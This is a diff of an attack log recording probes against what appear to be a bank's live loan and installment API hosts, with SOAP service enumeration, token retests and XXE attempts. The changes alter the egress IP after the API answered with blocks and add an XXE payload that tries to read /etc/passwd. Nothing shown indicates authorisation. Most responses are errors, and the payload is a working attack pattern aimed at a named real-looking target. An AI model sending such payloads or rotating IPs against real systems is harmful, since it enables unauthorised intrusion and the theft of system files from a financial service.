@@ -1,5 +1,5 @@
 == EGRESS IP ==
-20.118.30.1
+3.41.210.134
 503 /exp-api-cicilan/1.0/ => {"code":"700700","type":"API blocked","description":"This API has been blocked temporarily. Please try again later or contact the system administrators."}
 503 /exp-api-cicilan/1.0/cicilan/dashboard => {"code":"700700","type":"API blocked","description":"This API has been blocked temporarily. Please try again later or contact the system administrators."}
 503 /exp-api-portal-loan/1.0/loan/partner/config => {"code":"700700","type":"API blocked","description":"This API has been blocked temporarily. Please try again later or contact the system administrators."}
@@ -7,9 +7,9 @@
 == PAYUUNG API RETEST (client_credentials) ==
 payuung token: 401 {"status":401,"code":"401","data":null,"message":"Access Denied"}
 == V10: SOAP DISCOVERY + XXE ==
-WFC generic: 500 <?xml version='1.0' encoding='UTF-8'?><soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"><soapenv:Body><soapenv:Fault xmlns:axis2ns34="http://schemas.xmlsoap.org/soap/envelope/"><faultcode>axis2ns34:Client</faultcode><faultstring>The endpoint reference (EPR) for the Operation not found is /services/WorkflowCallbackService and the WSA Action = . If this EPR was previously r
-ECHO: 500 <?xml version='1.0' encoding='UTF-8'?><soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"><soapenv:Body><soapenv:Fault xmlns:axis2ns35="http://schemas.xmlsoap.org/soap/envelope/"><faultcode>axis2ns35:Client</faultcode><faultstring>The endpoint reference (EPR) for the Operatio
-XXE WFC: 500 <?xml version='1.0' encoding='UTF-8'?><soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"><soapenv:Body><soapenv:Fault xmlns:axis2ns36="http://schemas.xmlsoap.org/soap/envelope/"><faultcode>axis2ns36:Client</faultcode><faultstring>The endpoint reference (EPR) for the Operation not found is /services/WorkflowCallbackService and the WSA Action = . If this EPR was previously r
+WFC generic: 500 <?xml version='1.0' encoding='UTF-8'?><soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"><soapenv:Body><soapenv:Fault xmlns:axis2ns41="http://schemas.xmlsoap.org/soap/envelope/"><faultcode>axis2ns41:Client</faultcode><faultstring>The endpoint reference (EPR) for the Operation not found is /services/WorkflowCallbackService and the WSA Action = . If this EPR was previously r
+ECHO: 500 <?xml version='1.0' encoding='UTF-8'?><soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"><soapenv:Body><soapenv:Fault xmlns:axis2ns43="http://schemas.xmlsoap.org/soap/envelope/"><faultcode>axis2ns43:Client</faultcode><faultstring>The endpoint reference (EPR) for the Operatio
+XXE WFC: 500 <?xml version='1.0' encoding='UTF-8'?><soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"><soapenv:Body><soapenv:Fault xmlns:axis2ns44="http://schemas.xmlsoap.org/soap/envelope/"><faultcode>axis2ns44:Client</faultcode><faultstring>The endpoint reference (EPR) for the Operation not found is /services/WorkflowCallbackService and the WSA Action = . If this EPR was previously r
 OP process => 500 <?xml version='1.0' encoding='UTF-8'?><soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"><soape
 OP callback => 500 <?xml version='1.0' encoding='UTF-8'?><soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"><soape
 OP notify => 500 <?xml version='1.0' encoding='UTF-8'?><soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"><soape
@@ -26,13 +26,11 @@ SVC CallbackService => 404 {"code":"404","type":"Status report","message":"Not F
 SVC BinaService => 404 {"code":"404","type":"Status report","message":"Not Found","
 SVC OnboardingService => 404 {"code":"404","type":"Status report","message":"Not Found","
 SVC MasterDataService => 404 {"code":"404","type":"Status report","message":"Not Found","
-== V11: resumeEvent + echo ops ==
-RE [test-ref-123][APPROVED] => 404 
-RE [test-ref-123][REJECTED] => 404 
-RE [123e4567-e89b-12d3-a456-426614174000][APPROVED] => 404 
-RE [123e4567-e89b-12d3-a456-426614174000][REJECTED] => 404 
-RE [1][APPROVED] => 404 
-RE [1][REJECTED] => 404 
-RE [subscription-approval-test][APPROVED] => 404 
-RE [subscription-approval-test][REJECTED] => 404 
-ECHO => 500 <?xml version='1.0' encoding='UTF-8'?><soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"><soapenv:Body><soapenv:Fault><faultcode>soapenv:Server</faultcode><faultstring>wrong number of arguments</faultstring><detail/></soapenv:Fault></soapenv:Body></soapenv:Envelope>
+== V12: apigw host lain + echo XXE ==
+apigw.bankina.id/exp-api-cicilan/1.0/ => 502 <!doctype html><meta charset="utf-8"><meta name=viewport content="width=device-width, initial-scale=1"><title>502</title>502 Bad Gateway
+apigw.bankina.id/exp-api-portal-loan/1.0/ => 502 <!doctype html><meta charset="utf-8"><meta name=viewport content="width=device-width, initial-scale=1"><title>502</title>502 Bad Gateway
+api.bankina.id/exp-api-cicilan/1.0/ => 404 404 page not found
+api.bankina.id/exp-api-portal-loan/1.0/ => 404 {"code":"404","type":"Status report","message":"Runtime Error","description":"No matching resource found for given API Request"}
+XXE body: <?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><soapenv:Envelope xmlns:soapenv="http://s
+ECHO XXE => 500 <?xml version='1.0' encoding='UTF-8'?><soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"><soapenv:Body><soapenv:Fault><faultcode>soapenv:Server</faultcode><faultstring>wrong number of arguments</faultstring><detail/></soapenv:Fault></soapenv:Body></soapenv:Envelope>
+ECHO NORM => 500 <?xml version='1.0' encoding='UTF-8'?><soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"><soapenv:Body><soapenv:Fault><faultcode>soapenv:Server</faultcode><faultstring>wrong number of arguments</faultstring><detail/></soapenv:Fault></soapenv:Body></soapenv:Envelope>
